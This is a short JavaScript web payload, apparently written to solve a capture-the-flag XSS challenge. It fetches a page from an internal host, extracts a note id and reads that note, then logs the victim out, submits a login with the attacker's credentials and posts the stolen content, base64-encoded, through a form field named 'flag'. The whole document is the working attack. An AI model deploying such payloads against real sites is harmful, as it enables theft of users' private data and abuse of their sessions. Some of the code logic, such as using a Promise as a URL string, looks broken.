var a = fetch("http://172.77.0.3:8080/",{redirect: 'follow'}).then(x=>x.text()).then(x=>x.substring(x.indexOf('/read?id=')+9,65))
var data = fetch("/read/"+a).then(x=>x.text()).then(x=>eval(data=x));
location.href='/logout';
document.forms[0][1].value="aaaaaaaa";
document.forms[0][0].value="aaaaaaaa";
document.forms[0].submit();
document.forms[0][0].value='flag';
document.forms[0][1].value=btoa(data);
document.forms[0].submit();
